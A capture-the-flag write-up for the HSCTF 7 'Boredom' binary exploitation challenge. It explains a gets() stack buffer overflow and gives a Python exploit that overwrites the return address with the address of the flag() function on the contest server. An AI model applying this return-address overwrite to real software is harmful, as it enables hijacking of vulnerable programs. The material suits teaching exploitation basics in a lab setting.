# Table of contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Points](#Challenge-Points)
6. [Challenge Description](#Challenge-Description)
7. [Attachments](#Attachments)
8. [Solution](#Solution)

# Author
Kaffarel

# CTF
HSCTF 7

# Category
Binary Exploitation

# Challenge-Name
Boredom

# Challenge-Points
100 pts

# Challenge-Description
Keith is bored and stuck at home. Give him some things to do.
Connect at nc pwn.hsctf.com 5002.

Note, if you're having trouble getting it to work remotely:
* Check your offset, the offset is slightly different on the remote server
* The addresses are still the same
Author: PMP
Files: C source file, Executable of the same program

# Attachments
_None_

# Solution
First I looked at the source code in the attached .c file.
There I found a function named flag() which would output the flag stored in a file on the server. But the file is never called in the main function.
The main function uses gets() to get the input (what you should never do!).
I also noticed the buffer for the input, toDo, is 200 chars big.
So I opened the executable in objdump: `objdump -d boredom`. With objdump we can look at the disassembly of the executable.
In the third line of the main function we find this piece of code:

``` asm
401264:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
```
This changes the stack pointer (%rsp) and subtracts 0xd0 from it to make space for local variables.
If we convert 0xd0 in decimal we get: 208. We know that we only have one variable in the main function and that variable is 200 chars in size.
The additional 8 bytes are here because the OS stores variables in addresses of powers of two, so if we overwrite the local space for variables (208 bytes),
we get to the base pointer (ebp) stored in the stack before the local memory.
After the base pointer we have the address of the next instruction in the main function.
So if we overwrite this address with the address of the flag function we will return to the flag function instead of the main function.

So in python:

``` python3
#!/usr/bin/python
import struct
import socket
import sys
s = socket.socket()
s.connect(('pwn.hsctf.com', 5002))
print(s.recv(1024))
s.send("A"*200 + "\xd5\x11\x40\x00\x00\x00\x00\x00")
print(s.recv(1024))
```
Note on the local machine the offset is 208, so we have to put 208 A’s and on the remote machine the offset is 200.

In-Depth explanation:
https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
